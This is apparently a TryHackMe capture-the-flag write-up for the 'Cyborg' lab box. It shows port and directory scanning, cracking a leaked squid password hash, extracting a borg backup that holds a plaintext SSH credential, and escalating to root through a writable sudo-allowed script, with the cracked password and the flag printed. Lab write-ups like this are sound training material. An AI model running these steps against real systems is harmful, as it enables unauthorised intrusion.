---
title: THM-Writeups_Cyborg
categories: [Writeup tryhackme]
tags: [tryhackme, pentest]
---
![]({{site.baseurl}}/assets/img/writeups-cyborg.jpeg){:width="100%"}

###### A box involving encrypted archives, source code analysis and more. 

---

#### Let's use nmap to check the machine's ports.

```
─[✗]─[aj-tap@parrot]─[~]
└──╼ $sudo nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan 10.10.125.131
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-06 21:06 +08
Nmap scan report for 10.10.125.131
Host is up (0.30s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/6%OT=22%CT=1%CU=39276%PV=Y%DS=4%DC=I%G=Y%TM=6367B20
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.88 seconds
```
#### There are two open ports. SSH is listening on Port 22, while HTTP is listening on Port 80. We can verify this by grabbing the banner with netcat on port 22 and running whatweb on port 80.

```
┌─[✗]─[aj-tap@parrot]─[~]
└──╼ $nc 10.10.125.131 22
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10
```

```
┌─[aj-tap@parrot]─[~]
└──╼ $whatweb 10.10.125.131 
http://10.10.125.131 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.125.131], Title[Apache2 Ubuntu Default Page: It works]
```

---

#### Let's look into the web application. We discovered that the root url contains a default Apache web page. Further investigation revealed a file in /etc/squid/squid.conf and etc/squid/passwd. It appears to be a squid proxy server that has been incorrectly configured.

### /etc/squid/squid.conf Page
![]({{site.baseurl}}/assets/img/writeups-cyborg-1.png){:width="100%"}

### /etc/squid/passwd Page
![]({{site.baseurl}}/assets/img/writeups-cyborg-2.png){:width="100%"}

#### Let's use the dirb tool to discover the site's hidden directories.
```
┌─[✗]─[aj-tap@parrot]─[~/Desktop]
└──╼ $dirb http://10.10.125.131/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Nov  6 21:27:34 2022
URL_BASE: http://10.10.125.131/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.125.131/ ----
	==> DIRECTORY: http://10.10.125.131/admin/    
```
### /admin Page
![]({{site.baseurl}}/assets/img/writeups-cyborg-3.png){:width="100%"}
![]({{site.baseurl}}/assets/img/writeups-cyborg-4.png){:width="100%"}

We just discovered the admin page. Based on the conversation, Alex set up a squid proxy, but due to a lack of knowledge of the technology, this results in a misconfiguration, which leads to an information disclosure. We found out before that the password hash is located on /squid/passwd. The admin page also includes an archive.tar file. 

![]({{site.baseurl}}/assets/img/writeups-cyborg-5.png){:width="100%"}

```
┌─[aj-tap@parrot]─[~/Desktop/cyborg/home/field/dev/final_archive]
└──╼ $cat README 
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```
#### Based on the README file, these are encrypted backup files used by the borg tool, which is a deduplicating backup program. We can simply install borgback using apt package manager.
```
[aj-tap@parrot]─[~/Desktop/cyborg/home/field/dev/final_archive]
└──╼ $sudo apt install borgbackup
```
#### https://borgbackup.readthedocs.io/en/stable/installation.html#distribution-package
```
─[aj-tap@parrot]─[~/Desktop/cyborg/home/field/dev/final_archive]
└──╼ $borg list .
Enter passphrase for key /home/user/Desktop/cyborg/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 22:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```
#### Using borgbackup list flag, it gaves us contents of the repository which is a encrypted music_archive. We already obtain the hash password of music_archive before. Let's crack it using john. 

```
─[aj-tap@parrot]─[~/Desktop]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt hashpass.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (music_archive)
1g 0:00:00:00 DONE (2022-11-06 21:33) 2.380g/s 93257p/s 93257c/s 93257C/s 091983..lilica
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

#### We recover the password from the hash. Let's supply this to borgbackup, then unpack the music archive and examine its contents.

```
┌─[aj-tap@parrot]─[~/Desktop/cyborg/home/field/dev/final_archive]
└──╼ $mkdir unpacked_backup
┌─[aj-tap@parrot]─[~/Desktop/cyborg/home/field/dev/final_archive]
└──╼ $borg mount . unpacked_backup/
Enter passphrase for key /home/user/Desktop/cyborg/home/field/dev/final_archive: 
┌─[aj-tap@parrot]─[~/Desktop/cyborg/home/field/dev/final_archive]
└──╼ $cd unpacked_backup/
┌─[aj-tap@parrot]─[~/Desktop/cyborg/home/field/dev/final_archive/unpacked_backup]
└──╼ $tree 
.
└── music_archive
    └── home
        └── alex
            ├── Desktop
            │   └── secret.txt
            ├── Documents
            │   └── note.txt
            ├── Downloads
            ├── Music
            ├── Pictures
            ├── Public
            ├── Templates
            └── Videos

11 directories, 2 files
┌─[aj-tap@parrot]─[~/Desktop/cyborg/home/field/dev/final_archive/unpacked_backup]
└──╼ $cat music_archive/home/alex/Desktop/secret.txt 
shoutout to all the people who have gotten to this stage whoop whoop!"
┌─[aj-tap@parrot]─[~/Desktop/cyborg/home/field/dev/final_archive/unpacked_backup]
└──╼ $cat music_archive/home/alex/Documents/note.txt 
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3

```

#### We simply obtained Alex's password from the note.txt file. Let's use this credential to log in to the machine's ssh.
```
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```
#### We found out that we can sudo backup.sh. Using this file, we can elavate our user account to root account. First, change the file permissions to read and write, and then add a script that invokes the bash program.
```
alex@ubuntu:~$ chmod 777 /etc/mp3backups/backup.sh 
alex@ubuntu:~$ echo "/bin/bash" > /etc/mp3backups/backup.sh 
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh 
root@ubuntu:~# cat /root/root.txt 
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```
